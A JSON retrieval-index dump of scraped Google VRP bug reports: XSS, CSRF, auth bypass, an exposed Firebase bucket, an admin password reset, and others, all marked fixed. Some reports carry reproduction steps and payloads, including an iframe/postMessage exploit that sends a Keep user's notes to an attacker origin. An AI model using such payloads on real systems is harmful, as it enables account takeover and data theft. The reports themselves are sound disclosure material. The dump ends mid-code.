"class_name": "TextNode"}, "__type__": "1"}, "625573f9-780b-4e19-b060-9a222a7f8dc6": {"__data__": {"id_": "625573f9-780b-4e19-b060-9a222a7f8dc6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_329027.txt", "file_name": "20250408_175717_329027.txt", "file_type": "text/plain", "file_size": 1286, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ff845f64-3bd1-459b-b866-fb62239cfe5e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_329027.txt", "file_name": "20250408_175717_329027.txt", "file_type": "text/plain", "file_size": 1286, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "61684553d65a558c7cd072e52472ed1ae660a57f25a943e8e5a6a129ce9d5c44", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://support.google.com/android/thread/\r\nReported by:\r\nGaurav Bhatia\r\nGoogle VRP\r\nclosed\r\n20:20 | May 17, 2021\r\naccepted\r\n21:41 | May 19, 2021\r\nfixed\r\n21:41 | Mar 24, 2022\r\nreward decided\r\n$100\r\nSummary: Exif Geolocation data not stripped from images in community section in support.google.com\r\nSteps to reproduce:\r\nGo to\r\nhttps://support.google.com/\r\n> communities > ask now section\r\nEnter the details\r\nUpload this  image from drive \"\r\nhttps://drive.google.com/file/d/1UNXdXH-U3bOFfTsQqexuZgrH3J3tMBu3/view?usp=sharing\"\r\nin details and post section in ask now\r\nAfter uploading the image click on continue and post the thread to the community\r\nAfter post is uploaded to the community right click on the image and select copy the image link\r\nGo to\r\nhttp://exif.regex.info/\r\nand paste the image link in url and click on view image metadata\r\nThere you can able to see geolocation, camera model and a lot more information\r\nBrowser/OS: \r\nMicrosoft Edge\r\nAttack scenario:\r\nExample,\r\nAs the image is publicly available in community anyone can exploit this vulnerability by seeing the metadata of image uploaded and can gain the information like geolocation camera model and name and much more.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1270, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7f8f5531-db58-44fb-aba1-877928b301a8": {"__data__": {"id_": "7f8f5531-db58-44fb-aba1-877928b301a8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_376030.txt", "file_name": "20250408_175717_376030.txt", "file_type": "text/plain", "file_size": 1949, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "af877349-d564-49f8-9987-efabe2d3866b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_376030.txt", "file_name": "20250408_175717_376030.txt", "file_type": "text/plain", "file_size": 1949, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "9f56194088cc6ad4aadbb7ca6f0603a49f0328754f368a4f0d66fdf48ccc2639", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://owlchemylabs.com/\r\nReported by:\r\nBasavaraj Banakar\r\nGoogle VRP\r\ntriaged\r\n19:49 | May 17, 2021\r\naccepted\r\n19:50 | May 20, 2021\r\nfixed\r\n07:24 | Jun 7, 2021\r\nreward decided\r\n$500\r\nSummary: Plastic SCM Server access by Resetting administrator password.\r\nDescription: Plastic SCM  is a cross-platform commercial distributed version control tool developed by C\u00f3dice Software Inc. It is available for Microsoft Windows, Mac OS X, Linux, and other operating systems. It includes a command-line tool, native GUIs, diff and merge tool and integration with a number of IDEs. It is a full version control stack not based on Git (although it can communicate with it).\r\nSteps to reproduce:\r\nGo to\r\nhttps://35.244.187.233/account\r\nor\r\nhttps://35.190.11.91/account\r\nin Chrome browser and you can see that its common name is pointing to owlchemylabs.com\r\nNow it asks for password for login, we dont have password for login, now as an attacker i will change administrator password, now change url to\r\nhttps://35.190.11.91/account/register\r\nor\r\nhttps://35.244.187.233/account/register\r\nNow give new password on both password fields and You will get access to internal dashboard of server configuration of plastic scm\r\nBrowser/OS: \r\nWindows 10 Chrome Version 90.0.4430.212 (Official Build) (64-bit)\r\nProof of Concept : See the below video\r\nhttps://drive.google.com/file/d/1DV61OdzSp7i74-JvPBjr0FT0cWHcJUY5/view?usp=sharing\r\nAttack scenario:\r\nAny unauthenticated users can change password for administrator user and he get access to server configuration, By that attacker will get database creds in the storage section and attacker can add users delete all users and change password of all users and he will get IP adresses of all users in that server etc.\r\nAcquisition info:\r\nIt was acquired by Google on May 10th 2017\r\nhttps://en.wikipedia.org/wiki/Owlchemy_Labs\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1932, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "79ae6501-f4b5-4e60-8170-c092bcd02a66": {"__data__": {"id_": "79ae6501-f4b5-4e60-8170-c092bcd02a66", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_423436.txt", "file_name": "20250408_175717_423436.txt", "file_type": "text/plain", "file_size": 827, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6756cc79-1442-4d55-a76c-b847f8620d42", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_423436.txt", "file_name": "20250408_175717_423436.txt", "file_type": "text/plain", "file_size": 827, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3dbc006f5d3034301fcb3d407c0cbaa1a45d79402c2aed748d7caa7aace4c1eb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https:// [APPNAME].googleplex.com/domain?domain=https://&search_id=1617764323219&sessionId=roddis-1617764323219\r\nReported by:\r\nRio Mulyadi Pulungan\r\nGoogle VRP\r\ntriaged\r\n18:10 | Apr 7, 2021\r\naccepted\r\n23:09 | Apr 7, 2021\r\nfixed\r\n12:30 | Jul 23, 2021\r\ntriaged\r\n15:49 | Sep 24, 2021\r\naccepted\r\n15:56 | Sep 24, 2021\r\nfixed\r\n13:28 | Oct 16, 2021\r\nreward decided\r\n$6,267.40\r\nGoogle comment\r\nThis was indeed a \"blind\" XSS in one of our internal tools.\r\nHey i found Blind XSS in Admin Dashboard, the payload get executed in name, i can't remember the injection point, maybe you can see with DOM.html\r\nI will update to you if i remember the Injection Point\r\nBrowser/OS: Google Chrome\r\nAttack scenario:\r\nAdmin Cookie Steal, Session Hijacking\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 811, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a51cfa4a-203a-49cc-8dbf-24f47af93d46": {"__data__": {"id_": "a51cfa4a-203a-49cc-8dbf-24f47af93d46", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_532246.txt", "file_name": "20250408_175719_532246.txt", "file_type": "text/plain", "file_size": 1716, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cc13b3fa-6fab-4857-b0f2-776ed395ab0e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_532246.txt", "file_name": "20250408_175719_532246.txt", "file_type": "text/plain", "file_size": 1716, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d819594d64a7abddbd5eea2bb76c3508df55e7c006fb6f2e13ba20a83609a1a0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://www.appsheet.com/Template/AppDef?appName=thunthung-3004918&linkFrom=CopyApp#Users.Allowlist\r\nReported by:\r\nARJUN SINGH SiKARWAR\r\nGoogle VRP\r\ntriaged\r\n03:35 | Apr 7, 2021\r\naccepted\r\n17:04 | Apr 13, 2021\r\nfixed\r\n16:15 | May 12, 2021\r\nSummary: Invited user can signup with restricted Oauth example: google, dropbox\r\nDescription: It has been identified on the appsheet.com main domain, we have an ability to invite the user, Here the owner can set the rule of Oauth or we can say that admin can restrict the user from which Oauth they are sign in for example, admin can set the signup with dropbox only.. so the user will receive the invitation with the dropbox link only, but due to the misconfiguration in the application, a user can  also specify the oauth by just changing the parameter\r\nExample: if the admin has set the Oauth only to google, Here user can signup with dropbox, apple and other provider\r\nStep to Reproduce\r\nSignup on appsheet.com as admin\r\nGoto user tab\r\nType user email\r\nIn the authentication provider select  as apple and invite the user\r\nUser receives the link of invitation\r\nUser sees the authentication is only apple\r\nNow user tamper the provider parameter and rename it to google,or dropbox\r\nnow he can signup with google and other provider as well\r\nAttack scenario:\r\nWe can see this rule is clearly violating the admin permission rules, Or we can say that this escalating the bit of permission of admin rules\r\nSupporting video poc\r\nhttps://drive.google.com/file/d/18z_DRW8qCvf4jwVDc4DaNBBhi5XcWXKx/view\r\nAcquisition info:\r\nIt was acquired by google on  14 jab 2020     appsheet.com\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1700, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7c9dab0f-c58e-4f5c-8e42-4cf5ca0ba76a": {"__data__": {"id_": "7c9dab0f-c58e-4f5c-8e42-4cf5ca0ba76a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_579339.txt", "file_name": "20250408_175719_579339.txt", "file_type": "text/plain", "file_size": 2094, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "232ff45f-7478-40d2-8f8c-6d05c493b2d5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_579339.txt", "file_name": "20250408_175719_579339.txt", "file_type": "text/plain", "file_size": 2094, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0e741b07892f4f34021b7b85a214b386b442b1cb008e0f5c0d24595e5ae09083", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://motus.area120.com/\r\nReported by:\r\nDaniel Wallace\r\nGoogle VRP\r\ntriaged\r\n15:43 | Mar 15, 2021\r\naccepted\r\n18:05 | Mar 20, 2021\r\nfixed\r\n02:01 | Apr 7, 2021\r\nreward decided\r\n$500\r\nSummary: Bucket containing sensitive user data is accessible and freely browseable for all authenticated users\r\nSteps to reproduce:\r\nSign up or log in to\r\nhttps://motus.area120.com\r\n- Motus is a Google-owned service\r\nRetrieve the JWT issued by the website once logged in (e.g. Bearer eyJhbGciOiJS...)\r\nBrowse to GET\r\nhttps://firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/\r\nin a REST client with the aforementioned token in an Authorization header\r\nObserve the files listed. Many are general content which users are supposed to be able to access such as video courses, however there are a large amount of files called things like 2021-01-22T23:08:02_38533/all_namespaces/all_kinds/output-0. These appear to be system exports containing a lot of user information and also Stripe payment provider user IDs.\r\nGet a download token for the file by hitting GET\r\nhttps://firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/{url\r\nencoded filename}\r\nDownload the file by then adding ?alt=media&token={token} to the end of the URL\r\nExample of a file that is accessible:\r\nGET\r\nhttps://firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/2021-01-22T23%3A08%3A02_38533%2Fall_namespaces%2Fall_kinds%2Foutput-0?alt=media&token=ca73a34c-31b1-40a1-bddf-ea0dcb095948\r\nMitigation:\r\nUsers of Area120 should not have permission to browse the bucket freely; nowhere on the website appears to utilize this use case. Arguably, these kinds of system exports may not be appropriate for such a storage location.\r\nNote:\r\nThere appears to be many, many other files like this although I stopped and submitted this report as soon as I noticed this first one contained user data\r\nAttack scenario:\r\nA regular user of Motus Area120, once logged in, could access a large amount of sensitive user information.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2078, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fdfe6a42-f7f6-4433-b640-db6c8471ae3e": {"__data__": {"id_": "fdfe6a42-f7f6-4433-b640-db6c8471ae3e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_610862.txt", "file_name": "20250408_175719_610862.txt", "file_type": "text/plain", "file_size": 2465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2e36d5de-57f3-4191-b2b0-f727da160a54", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_610862.txt", "file_name": "20250408_175719_610862.txt", "file_type": "text/plain", "file_size": 2465, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "4f2bdf4dc522ecce28fb30d23ade117fc89cbe516a3097e19958b7689ec43a12", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nUnencrypted HTTP Links to Google Scholar in Search results\r\nReported by:\r\nDavid Sch\u00fctz\r\nGoogle VRP\r\ntriaged\r\n23:42 | Mar 9, 2021\r\naccepted\r\n02:05 | Mar 12, 2021\r\nfixed\r\n21:27 | Aug 13, 2021\r\nReport description\r\nUnencrypted HTTP Links to Google Scholar in Search results\r\nBug location\r\nWhich product or website have you found a vulnerability in?\r\nGoogle Search\r\nThe problem\r\nPlease describe the technical details of the vulnerability\r\nCore Issue:\r\nOn Google Search, the special\r\nScholar\r\nsearch results starting with\r\nScholarly articles for\r\nuse unencrypted HTTP links, instead of HTTPS. Thus, when a user clicks on a\r\nScholar\r\nresults, an unencrypted HTTP request is made.\r\nSteps to Reproduce:\r\nGo to\r\nhttps://www.google.com\r\nSearch for\r\nA Theory of Human Motivation\r\nUnder the\r\nAds\r\nsection, see the\r\nScholarly articles for\r\nsection\r\nSee that the link to the Scholar search\r\nScholarly articles for A Theory of Human Motivation\r\nand the direct links to the documents are HTTP links instead of HTTPS\r\nExtras:\r\nWeirdly enough, in the parameters of the Scholar direct links, a parameter\r\nnossl=1\r\ncan be found. Was this intentional for some reason?\r\nFor the query\r\nA Theory of Human Motivation\r\nthe seconds result is a\r\n[BOOK]\r\nresult, pointing to Google Books. While from the Scholar search page, the link to Google Books is HTTPS, here, the direct link is also HTTP (\r\nhttp://scholar.google.hu/scholar_url?url=http://www.google.com/books\r\n). That should also be HTTPS.\r\nPlease briefly explain who can exploit the vulnerability, and what they gain when doing so\r\nA passive eavesdropper who has access to the victim's network traffic (targeted attack, ISP) could capture and read these unencrypted requests, and track what Scholar query the victim has searched for, and what documents she opened.\r\nThis leaks private information (queries, documents opened), which should never be visible to any passive eavesdropper.\r\nFurthermore, an active MITM attacker might also spoof the unencrypted HTTP response from Google Scholar, and redirect the user to a fake/malicious page.\r\nThe cause\r\nChoose the type of vulnerability\r\nSensitive data exposure\r\nDoes anyone else know about this vulnerability?\r\nNo, this vulnerability is private\r\nDo you plan to disclose this bug publicly?\r\nYes\r\nWhen do you plan to disclose this bug?\r\nMon Jun 07 2021 00:00:00 GMT+0200 (Central European Summer Time)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2448, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0d10d235-5c10-4450-87e3-f73b235b6fb9": {"__data__": {"id_": "0d10d235-5c10-4450-87e3-f73b235b6fb9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_657985.txt", "file_name": "20250408_175719_657985.txt", "file_type": "text/plain", "file_size": 749, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e6bbdfaa-2896-47f9-9a8d-443630303409", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_657985.txt", "file_name": "20250408_175719_657985.txt", "file_type": "text/plain", "file_size": 749, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5ded0cf9e530241bca9ef7fbbe631b9062b684a48f2aa4e689f35cae080be719", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://run.qwiklabs.com/my_account\r\nReported by:\r\nJaydev Ahire (CyborJ)\r\nGoogle VRP\r\ntriaged\r\n22:45 | Mar 1, 2021\r\naccepted\r\n00:54 | Mar 4, 2021\r\nfixed\r\n14:42 | Mar 15, 2021\r\nHello Team,\r\nI have found a stored XSS and HTML Injection on qwiklabs.com\r\nSteps to reproduce:\r\nSign up on qwiklabs.com\r\nIn name Filed put XSS payload\r\nIn last name put HTML Injection\r\nGo to your account and see XSS payload Display.\r\nI have uploaded POC Video in the Drive link Below.\r\nhttps://drive.google.com/drive/folders/1M3Tg3hn7rhKUX77Ly6N8JPJ5y_y8ZlE7?usp=sharing\r\nAttack scenario:\r\nXSS can use to steal cookies, passwords, or to run arbitrary code on a victim's browser.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 733, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e57f8230-e77c-44bd-8a4a-ca52dfdd70f5": {"__data__": {"id_": "e57f8230-e77c-44bd-8a4a-ca52dfdd70f5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_689337.txt", "file_name": "20250408_175719_689337.txt", "file_type": "text/plain", "file_size": 1828, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f57148e9-5935-4d0a-9aa3-7d80f7b2b56d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_689337.txt", "file_name": "20250408_175719_689337.txt", "file_type": "text/plain", "file_size": 1828, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "499e05c4338f9b18266a32db300afa2753a4a5afa04b09c75dd054376d72db47", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://keep-pa.clients6.google.com/static/proxy.html\r\nReported by:\r\nVinoth Kumar\r\nGoogle VRP\r\ntriaged\r\n05:18 | Feb 17, 2021\r\naccepted\r\n10:44 | Feb 20, 2021\r\nfixed\r\n08:36 | Mar 20, 2021\r\nreward decided\r\n$3,133.70\r\nSteps to reproduce:\r\nlog in to your Google account\r\nVisit\r\nhttps://vinothsparrow.herokuapp.com/static/google-xss.html\r\nThis will display your email, name and your Google keep notes.\r\nVulnerable Url:\r\nhttps://keep-pa.clients6.google.com/static/proxy.html\r\nVulnerable payload: JSON.stringify({\"s\":\"makeHttpRequests\",\"f\":\"..\",\"c\":1,\"a\":[[{\"key\":\"gapiRequest\",\"params\":{\"url\":\"/\",\"path\":\"/\",\"httpMethod\":\"GET\",\"headers\":{},\"urlParams\":{},\"root\":\"keep-pa.clients6.google.com\",\"authType\":\"1p\"}}]],\"l\":false,\"g\":true,t:\"\",\"r\":\"..\"})\r\nExploit:\r\nAdd the following code to your html file to exploit\r\n<iframe id=\"iframe\" src=\"https://keep-pa.clients6.google.com/static/proxy.html?usegapi=1&parent=https://yourwebsiteorigin/\"></iframe>\r\n<script type=\"text/javascript\">\r\n   window.addEventListener(\"message\",function(e) {\r\n   // e.data contains full HTML contents of\r\nhttps://keep-pa.clients6.google.com\r\nwhich is a replica of\r\nhttps://keep.google.com\r\non behalf of the logged-in user.\r\n   }\r\n   iframe.contenWindow.postMessage(JSON.stringify({\"s\":\"makeHttpRequests\",\"f\":\"..\",\"c\":1,\"a\":[[{\"key\":\"gapiRequest\",\"params\":{\"url\":\"/\",\"path\":\"/\",\"httpMethod\":\"GET\",\"headers\":{},\"urlParams\":{},\"root\":\"keep-pa.clients6.google.com\",\"authType\":\"1p\"}}]],\"l\":false,\"g\":true,t:\"\",\"r\":\"..\"}));\r\n</script>\r\nBrowser/OS: All\r\nPOC:\r\nUnlisted Youtube Video:\r\nhttps://youtu.be/x9sCZyB_kNQ\r\nAttack scenario:\r\nUsing this vulnerability an attacker can get logged in users name, email, token, and notes by just victim visit the attacker-controlled website\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1812, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cc9e2759-cf9b-412e-8192-55fcbd060453": {"__data__": {"id_": "cc9e2759-cf9b-412e-8192-55fcbd060453", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_736495.txt", "file_name": "20250408_175719_736495.txt", "file_type": "text/plain", "file_size": 1646, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e5dc82c0-936a-459f-89be-eb1ea21641d2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_736495.txt", "file_name": "20250408_175719_736495.txt", "file_type": "text/plain", "file_size": 1646, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7a70da84462d259ccea179c32fa5117fe3ae412ddf784f03dfa1205f7fd71797", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Waze Map Editor\r\nReported by:\r\nTushar Bhardwaj\r\nGoogle VRP\r\ntriaged\r\n05:19 | Feb 2, 2021\r\naccepted\r\n19:33 | Feb 2, 2021\r\nfixed\r\n00:00 | Apr 22, 2021\r\nreward decided\r\n$100\r\nSummary: Waze Map Editor is vulnerable to CSRF.\r\nSteps to reproduce:\r\nLogin to waze.com and go to\r\nhttps://www.waze.com/editor\r\nChoose a comment where we can ask the user who reported this issue.\r\nTurn on intercept in Burp, type a comment, and click on send.\r\nGo to Burp -->Right Click-->Engagement Tools-->Generate CSRF PoC\r\nClick test in the browser and drop the request. You will see that the comment was not sent.\r\nPaste the copied URL to the browser.\r\nYou will see a JSON response which confirms that the comment has been created.\r\nGo to\r\nhttps://www.waze.com/editor\r\nand reload the page.\r\nClick on the comment to which we had added our comment.\r\nYou will see that our comment has been successfully added.\r\nNOTE: You can also copy the HTML code and paste it to create an HTML file, then send the file to the victim who is logged in to their Waze account.\r\nAttack scenario:\r\nAn attacker can use this CSRF vulnerability to force the victims to post comments on the other users' comments. The attacker can send the malicious HTML file to the victim and upon opening the file, the malicious comments will be posted from the victim's account without his knowledge.\r\nAcquisition info:\r\nWaze is a GPS navigation software app owned by Google. Blog-->\r\nhttps://techcrunch.com/2013/06/11/its-official-google-buys-waze-giving-a-social-data-boost-to-its-location-and-mapping-business/\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1630, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f9159372-9387-46e6-88ad-ee5443c13532": {"__data__": {"id_": "f9159372-9387-46e6-88ad-ee5443c13532", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_832305.txt", "file_name": "20250408_175721_832305.txt", "file_type": "text/plain", "file_size": 1762, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8042764e-2608-4e52-8407-57d9588f9755", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_832305.txt", "file_name": "20250408_175721_832305.txt", "file_type": "text/plain", "file_size": 1762, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5599fa0963a5a41cda71b59943654af1f0df98125180ef5b2b19a75dae2244c1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Google Translate extension\r\nReported by:\r\nJun Kokatsu\r\nGoogle VRP\r\ntriaged\r\n20:19 | Dec 15, 2020\r\naccepted\r\n20:33 | Dec 15, 2020\r\nfixed\r\n07:32 | Apr 18, 2023\r\nreward decided\r\n$3,133.70\r\nSummary: UXSS when a renderer process is compromised\r\nSteps to reproduce:\r\nInstall the extension (\r\nhttps://chrome.google.com/webstore/detail/google-translate/aapbdbdomjkkjkaonfhkkikfgjllcleb\r\n)\r\nOpen any page, and then open DevTools\r\nChange the JS execution context to the Google translate's content script, and execute\r\nchrome.storage.local.set({gtxTargetLang:\"test'+alert(1)+'\"});\r\nOpen\r\nhttps://www.google.com/robots.txt\r\nand then click on Google Translate icon and click \"translate this page\"\r\nObserve the alert(1)\r\nBrowser/OS: Chrome/Windows 10\r\nAttack scenario:\r\nVulnerable code:\r\nfunction Hb(a, b, c) {\r\n        b = {\r\n            pageLang: b,\r\n            userLang: c // <-----------------[1]\r\n        };\r\n        b.content = u(Fb, b)\r\n            .replace(/\\\\/g, \"\\\\\\\\\")\r\n            .replace(/'/g, \"\\\\'\")\r\n            .replace(/\"/g, '\\\\\"')\r\n            .replace(/\\n/g, \"\\\\n\");\r\n        chrome.tabs.executeScript(a, {\r\n            code: u(Gb, b)\r\n        }, function() {\r\n            